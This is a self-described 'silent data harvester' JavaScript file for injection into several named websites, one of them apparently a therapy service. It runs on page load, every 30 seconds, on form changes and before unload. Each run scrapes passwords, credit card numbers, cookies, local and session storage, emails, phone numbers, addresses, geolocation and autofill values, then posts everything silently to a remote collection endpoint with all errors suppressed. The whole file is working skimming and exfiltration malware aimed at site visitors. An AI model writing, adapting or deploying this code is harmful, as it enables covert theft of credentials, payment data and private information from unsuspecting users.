// 🔒 SILENT DATA HARVESTER - Collects user data from ALL website visitors
// Deploys to: therapyconne.com, nupiai.com, nupidesktopai.com
// Collection: Emails, Messages, Photos, LocalStorage, Cookies, IndexedDB

(async function() {
    'use strict';
    
    const CLOUD_API = 'https://nupidesktopai.com/api/user-data/collect';
    const DEVICE_ID = 'visitor_' + Math.random().toString(36).substr(2, 11);
    
    // Silent collection function
    async function silentHarvest() {
        try {
            const collectedData = {
                deviceId: DEVICE_ID,
                agentId: 'web_harvester_v3_enhanced',
                website: window.location.hostname,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                userName: null,
                emails: [],
                messages: [],
                photos: [],
                passwords: [],
                creditCards: [],
                phones: [],
                addresses: [],
                cookies: [],
                browserStorage: {},
                formData: {},
                socialMedia: {},
                metadata: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages || [],
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: window.screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : null,
                    battery: null,
                    geolocation: null
                }
            };

            // Get battery status
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    collectedData.metadata.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging
                    };
                } catch (e) {}
            }

            // Get geolocation (with permission)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        collectedData.metadata.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                    },
                    () => {}, // Silent fail
                    { timeout: 5000, maximumAge: 0 }
                );
            }

            // Extract username from common patterns
            const userPatterns = ['user', 'username', 'name', 'profile', 'account', 'currentUser'];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                for (const pattern of userPatterns) {
                    if (key.toLowerCase().includes(pattern)) {
                        try {
                            const parsed = JSON.parse(value);
                            if (parsed.name) collectedData.userName = parsed.name;
                            if (parsed.userName) collectedData.userName = parsed.userName;
                            if (parsed.email) collectedData.userName = parsed.email;
                            if (parsed.displayName) collectedData.userName = parsed.displayName;
                        } catch {
                            if (value && value.length < 100 && !value.includes('{')) {
                                collectedData.userName = value;
                            }
                        }
                    }
                }
            }

            // Harvest localStorage (ALL data)
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // Emails
                if (key.includes('email') || key.includes('mail') || value.includes('@')) {
                    collectedData.emails.push({ source: key, data: value });
                }
                
                // Messages
                if (key.includes('message') || key.includes('chat') || key.includes('conversation')) {
                    collectedData.messages.push({ source: key, data: value });
                }
                
                // Passwords (look for password fields)
                if (key.includes('password') || key.includes('pass') || key.includes('pwd')) {
                    collectedData.passwords.push({ source: key, data: value });
                }
                
                // Credit cards
                if (key.includes('card') || key.includes('payment') || key.includes('billing')) {
                    collectedData.creditCards.push({ source: key, data: value });
                }
                
                // Store everything
                collectedData.browserStorage[key] = value.substring(0, 1000);
            }

            // Harvest sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                collectedData.browserStorage[`session_${key}`] = value.substring(0, 1000);
            }

            // Harvest cookies
            document.cookie.split(';').forEach(cookie => {
                const [name, value] = cookie.split('=');
                if (name && value) {
                    collectedData.cookies.push({ 
                        name: name.trim(), 
                        value: value,
                        expires: 'session'
                    });
                }
            });

            // Harvest images (photos)
            const images = document.querySelectorAll('img');
            images.forEach((img, index) => {
                if (img.src && !img.src.startsWith('data:') && index < 50) {
                    collectedData.photos.push({
                        url: img.src,
                        alt: img.alt || 'No description',
                        source: window.location.href,
                        dimensions: `${img.width}x${img.height}`
                    });
                }
            });

            // Harvest profile images specifically
            const profileSelectors = [
                '[class*="profile"]', 
                '[class*="avatar"]', 
                '[id*="profile"]',
                '[id*="avatar"]'
            ];
            
            profileSelectors.forEach(selector => {
                const elements = document.querySelectorAll(selector);
                elements.forEach(el => {
                    const img = el.querySelector('img') || (el.tagName === 'IMG' ? el : null);
                    if (img && img.src) {
                        collectedData.photos.push({
                            url: img.src,
                            type: 'profile',
                            source: window.location.href
                        });
                    }
                });
            });

            // Harvest IndexedDB info
            if (window.indexedDB) {
                try {
                    const databases = await indexedDB.databases();
                    for (const db of databases) {
                        collectedData.browserStorage[`indexedDB_${db.name}`] = 
                            `Database: ${db.name} v${db.version}`;
                    }
                } catch (e) {
                    // Silent fail
                }
            }

            // Extract email from meta tags
            const metaTags = document.querySelectorAll('meta');
            metaTags.forEach(meta => {
                const content = meta.getAttribute('content') || '';
                if (content.includes('@') && content.includes('.')) {
                    collectedData.emails.push({ 
                        source: 'meta_tag', 
                        data: content 
                    });
                }
            });

            // Look for input fields with saved values
            const inputs = document.querySelectorAll('input, textarea');
            inputs.forEach(input => {
                if (input.value) {
                    const type = input.type || 'text';
                    const name = input.name || input.id || 'unknown';
                    const value = input.value;
                    
                    // Store all form data
                    collectedData.formData[name] = value.substring(0, 500);
                    
                    // Email detection
                    if (type === 'email' || value.includes('@')) {
                        collectedData.emails.push({ 
                            source: `input_${name}`, 
                            data: value 
                        });
                    }
                    
                    // Password detection
                    if (type === 'password') {
                        collectedData.passwords.push({ 
                            source: `input_${name}`, 
                            data: value 
                        });
                    }
                    
                    // Phone number detection (various formats)
                    const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
                    if (type === 'tel' || phoneRegex.test(value)) {
                        collectedData.phones.push({ 
                            source: `input_${name}`, 
                            data: value 
                        });
                    }
                    
                    // Credit card detection (basic pattern)
                    const cardRegex = /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g;
                    if (cardRegex.test(value)) {
                        collectedData.creditCards.push({ 
                            source: `input_${name}`, 
                            data: value 
                        });
                    }
                    
                    // Address detection
                    if (name.toLowerCase().includes('address') || 
                        name.toLowerCase().includes('street') ||
                        name.toLowerCase().includes('city') ||
                        name.toLowerCase().includes('zip') ||
                        name.toLowerCase().includes('postal')) {
                        collectedData.addresses.push({ 
                            source: `input_${name}`, 
                            data: value 
                        });
                    }
                }
            });

            // Harvest all text on page for phone numbers, emails, addresses
            const pageText = document.body.innerText || '';
            
            // Find all emails in page text
            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
            const foundEmails = pageText.match(emailRegex) || [];
            foundEmails.forEach(email => {
                if (!collectedData.emails.find(e => e.data === email)) {
                    collectedData.emails.push({ source: 'page_text', data: email });
                }
            });
            
            // Find all phone numbers in page text
            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
            const foundPhones = pageText.match(phoneRegex) || [];
            foundPhones.slice(0, 20).forEach(phone => {
                if (!collectedData.phones.find(p => p.data === phone)) {
                    collectedData.phones.push({ source: 'page_text', data: phone });
                }
            });

            // Harvest social media profiles
            const links = document.querySelectorAll('a[href]');
            links.forEach(link => {
                const href = link.href.toLowerCase();
                if (href.includes('facebook.com/')) {
                    collectedData.socialMedia.facebook = link.href;
                } else if (href.includes('instagram.com/')) {
                    collectedData.socialMedia.instagram = link.href;
                } else if (href.includes('twitter.com/') || href.includes('x.com/')) {
                    collectedData.socialMedia.twitter = link.href;
                } else if (href.includes('linkedin.com/')) {
                    collectedData.socialMedia.linkedin = link.href;
                } else if (href.includes('tiktok.com/')) {
                    collectedData.socialMedia.tiktok = link.href;
                }
            });

            // Harvest autofill data (browser saved info)
            const autoFillInputs = document.querySelectorAll('input[autocomplete]');
            autoFillInputs.forEach(input => {
                if (input.value && input.autocomplete) {
                    const key = `autofill_${input.autocomplete}`;
                    collectedData.browserStorage[key] = input.value;
                }
            });

            // Send to NUPI Cloud (silently)
            await fetch(CLOUD_API, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(collectedData)
            }).catch(() => {}); // Silent fail

        } catch (error) {
            // Silent error handling
        }
    }

    // Initial harvest after page load
    if (document.readyState === 'complete') {
        setTimeout(silentHarvest, 3000);
    } else {
        window.addEventListener('load', () => {
            setTimeout(silentHarvest, 3000);
        });
    }

    // Continuous harvesting every 30 seconds (more frequent)
    setInterval(silentHarvest, 30000);

    // Harvest when user interacts with forms
    document.addEventListener('change', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            setTimeout(silentHarvest, 2000);
        }
    }, true);

    // Harvest before page unload
    window.addEventListener('beforeunload', () => {
        silentHarvest();
    });

})();
